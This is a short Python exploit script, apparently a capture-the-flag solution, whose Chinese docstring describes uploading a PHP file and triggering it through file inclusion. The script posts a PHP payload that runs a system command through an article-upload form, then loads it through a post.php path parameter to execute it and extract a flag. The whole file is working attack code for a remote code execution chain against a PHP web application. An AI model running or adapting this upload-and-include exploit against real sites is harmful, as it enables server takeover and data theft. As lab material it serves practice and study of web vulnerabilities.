import re
import requests
import sys

'''
@文件命名：X-028-24
@使用方式: python X-028-24.py url
@简述思路: 上传可执行的 PHP 文件并通过包含触发命令执行，读取 /FLAG.txt。
'''


def Scan(url):
    sess = requests.Session()
    payload = '<?php system("cat /FLAG.txt"); ?>'
    files = {"articleFile": ("p.php", payload, "application/x-php")}
    data = {"name": "a", "email": "a@a.com"}
    sess.post(url + "/posts/upload-article.php", files=files, data=data)

    r = sess.get(url + "/post.php?id=uploads/p")
    m = re.search(r"FLAG\{[^}]+\}", r.text)
    return m.group(0)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
